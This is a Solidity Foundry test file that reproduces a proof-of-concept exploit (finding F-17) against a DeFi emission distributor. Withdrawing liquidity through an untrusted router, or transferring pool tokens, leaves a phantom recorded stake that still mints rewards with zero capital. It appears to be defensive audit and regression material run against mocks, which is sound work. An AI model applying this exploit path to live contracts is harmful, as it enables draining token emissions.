// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {AddLiquidityKind, RemoveLiquidityKind} from "@balancer-labs/v3-interfaces/contracts/vault/VaultTypes.sol";

import {AureumFeeRoutingHook} from "src/fee_router/AureumFeeRoutingHook.sol";
import {EmissionDistributorHarness} from "test/unit/harness/EmissionDistributorHarness.sol";
import {AuMMMinterRouter} from "src/token/AuMMMinterRouter.sol";
import {IAuMM} from "src/token/IAuMM.sol";
import {IGaugeRegistry} from "src/ccb/IGaugeRegistry.sol";
import {IEMASampler} from "src/ccb/IEMASampler.sol";
import {ICCBMultiplier} from "src/ccb/ICCBMultiplier.sol";
import {IEfficiencyOracle} from "src/gauge/IEfficiencyOracle.sol";
import {IMiliariumRegistry} from "src/ccb/IMiliariumRegistry.sol";
import {AureumTime} from "src/lib/AureumTime.sol";

import {MockERC20} from "test/mocks/MockERC20.sol";
import {MockERC4626} from "test/mocks/MockERC4626.sol";
import {
    MockAuMM,
    MockGaugeRegistry,
    MockEMASampler,
    MockCCBMultiplier,
    MockEfficiencyOracle,
    MockMiliariumRegistry
} from "test/unit/EmissionDistributor.t.sol";

/// @dev Router whose getSender() returns a fixed LP — mirrors F09's SpoofRouter.
contract StubRouter {
    address internal immutable sender;
    constructor(address sender_) { sender = sender_; }
    function getSender() external view returns (address) { return sender; }
}

/// @notice F-17 exploit PoC (WH-I.1, P-D18) — the recorder <-> BPT desync. AuMT is the pool's transferable BPT
///         (I-D14), but the EmissionDistributor recorder (userLP / poolTotalLP / effectiveQualBlock) is written
///         only on trusted-router liquidity callbacks (F-09 symmetric allowlist). A holder therefore reduces
///         real BPT — via a non-trusted-router removal (100% capital, no recordWithdrawal) or a plain ERC-20
///         transfer — while the recorder keeps the full stake, a phantom position that still mints emission and
///         confers governance weight. These assertions prove the exploit on CURRENT (unfixed) code; the fix
///         (P-D18 forfeit-delta downward reconciliation) will flip test (3) to mint ~0.
contract F17_RecorderBptDesyncTest is Test {
    uint256 internal constant GENESIS_BLOCK = 1_000_000;
    uint256 internal constant STAKE = 100e18;
    address internal constant GOV = address(0xC0FE);

    address internal vault;
    address internal moduleAdmin;
    address internal governance;
    address internal attacker;
    address internal sink;

    MockAuMM internal aumm;
    MockGaugeRegistry internal gauges;
    MockEMASampler internal ema;
    MockCCBMultiplier internal mult;
    MockEfficiencyOracle internal effOracle;
    MockMiliariumRegistry internal miliReg;
    EmissionDistributorHarness internal distributor;
    AuMMMinterRouter internal mintRouter;

    MockERC20 internal bpt;
    AureumFeeRoutingHook internal hook;
    StubRouter internal canonical;
    StubRouter internal selfRouter;

    function setUp() public {
        vault = makeAddr("vault");
        moduleAdmin = makeAddr("moduleAdmin");
        governance = makeAddr("governance");
        attacker = makeAddr("attacker");
        sink = makeAddr("sink");

        aumm = new MockAuMM();
        gauges = new MockGaugeRegistry();
        ema = new MockEMASampler();
        mult = new MockCCBMultiplier();
        effOracle = new MockEfficiencyOracle();
        miliReg = new MockMiliariumRegistry();
        distributor = new EmissionDistributorHarness(
            IAuMM(address(aumm)),
            IGaugeRegistry(address(gauges)),
            IEMASampler(address(ema)),
            ICCBMultiplier(address(mult)),
            IEfficiencyOracle(address(effOracle)),
            IMiliariumRegistry(address(miliReg)),
            GENESIS_BLOCK,
            GOV
        );
        mintRouter = new AuMMMinterRouter(IAuMM(address(aumm)), makeAddr("channel"), address(distributor));
        aumm.setMinter(address(mintRouter));
        vm.prank(GOV);
        distributor.setMintRouter(address(mintRouter));
        effOracle.setEmissionsRecorder(address(distributor));

        bpt = new MockERC20("Aureum BPT", "aBPT", 18);

        MockERC20 zchf = new MockERC20("Frankencoin", "ZCHF", 18);
        MockERC4626 svZchf = new MockERC4626(IERC20(address(zchf)), "svZCHF", "svZCHF");
        MockERC20 susds = new MockERC20("Savings USDS", "sUSDS", 18);
        MockERC20 hookAumm = new MockERC20("Aureum", "AuMM", 18);
        hook = new AureumFeeRoutingHook(
            vault,
            makeAddr("bodensee"),
            IERC20(address(svZchf)),
            IERC20(address(susds)),
            IERC20(address(hookAumm)),
            makeAddr("feeController"),
            moduleAdmin
        );
        vm.prank(moduleAdmin);
        hook.setEmissionRecorder(address(distributor));
        vm.prank(moduleAdmin);
        hook.setGovernanceModule(governance);

        vm.prank(GOV);
        distributor.setAuMTContractForPool(address(bpt), address(hook));
        canonical = new StubRouter(attacker);
        selfRouter = new StubRouter(attacker);
        vm.prank(governance);
        hook.setTrustedRouter(address(canonical), true);

        vm.roll(GENESIS_BLOCK);
    }

    function _empty() private pure returns (uint256[] memory) {
        return new uint256[](0);
    }

    function _trustedAdd(uint256 amount) private {
        bpt.mint(attacker, amount);
        vm.prank(vault);
        hook.onAfterAddLiquidity(
            address(canonical), address(bpt), AddLiquidityKind.UNBALANCED, _empty(), _empty(), amount, _empty(), bytes("")
        );
    }

    function _nonTrustedRemove(uint256 amount) private {
        vm.prank(vault);
        hook.onAfterRemoveLiquidity(
            address(selfRouter), address(bpt), RemoveLiquidityKind.PROPORTIONAL, amount, _empty(), _empty(), _empty(), bytes("")
        );
        bpt.burn(attacker, amount);
    }

    /// @notice A non-trusted-router removal recovers 100% of the BPT while the recorder keeps the full userLP —
    ///         a phantom position: recorded stake > 0 with zero live BPT.
    function test_F17_nonTrustedRemovalLeavesPhantomPosition() public {
        _trustedAdd(STAKE);
        assertEq(distributor.userLP(address(bpt), attacker), STAKE);
        assertEq(distributor.poolTotalLP(address(bpt)), STAKE);
        assertGt(distributor.effectiveQualBlock(address(bpt), attacker), 0);
        assertEq(bpt.balanceOf(attacker), STAKE);

        _nonTrustedRemove(STAKE);

        assertEq(distributor.userLP(address(bpt), attacker), STAKE);
        assertEq(distributor.poolTotalLP(address(bpt)), STAKE);
        assertGt(distributor.effectiveQualBlock(address(bpt), attacker), 0);
        assertEq(bpt.balanceOf(attacker), 0);
    }

    /// @notice A plain ERC-20 BPT transfer likewise leaves the recorder crediting the sender while the sender
    ///         holds zero BPT — the second desync path.
    function test_F17_bptTransferLeavesPhantomPosition() public {
        _trustedAdd(STAKE);
        vm.prank(attacker);
        bpt.transfer(sink, STAKE);

        assertEq(distributor.userLP(address(bpt), attacker), STAKE);
        assertEq(bpt.balanceOf(attacker), 0);
        assertEq(bpt.balanceOf(sink), STAKE);
    }

    /// @notice ROI (S9) — the phantom position mints AuMM emission with zero locked capital: add via the trusted
    ///         router, recover 100% of the BPT via a non-trusted router, then claim the full one-block emission
    ///         (1e18) as if the capital were still staked.
    function test_F17_phantomPositionMintsEmissionWithZeroCapital() public {
        gauges.setApproved(address(bpt), true);
        ema.setTVLEMA(address(bpt), 100e18);
        mult.setMultiplier(address(bpt), 1e18);
        vm.roll(AureumTime.year1EndBlock(GENESIS_BLOCK));
        distributor.recordScore(address(bpt));

        _trustedAdd(STAKE);
        vm.roll(AureumTime.year1EndBlock(GENESIS_BLOCK) + 1);
        _nonTrustedRemove(STAKE);

        assertEq(distributor.userLP(address(bpt), attacker), STAKE);
        assertEq(bpt.balanceOf(attacker), 0);

        vm.prank(attacker);
        distributor.claim(address(bpt), sink);

        assertEq(aumm.balanceOf(sink), 1e18);
    }
}
